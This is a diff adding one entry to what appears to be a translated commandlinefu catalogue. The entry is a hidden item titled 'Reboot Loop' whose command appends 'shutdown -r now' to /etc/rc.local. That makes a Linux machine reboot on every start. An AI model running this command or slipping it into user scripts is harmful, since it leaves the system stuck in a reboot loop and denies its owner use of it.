@@ -1,0 +1,8 @@
+commandlinefu_id: 594
+translator:
+  weibo: ''
+hide: true
+command: |-
+  echo "shutdown -r now" >> /etc/rc.local
+summary: |-
+  Reboot Loop
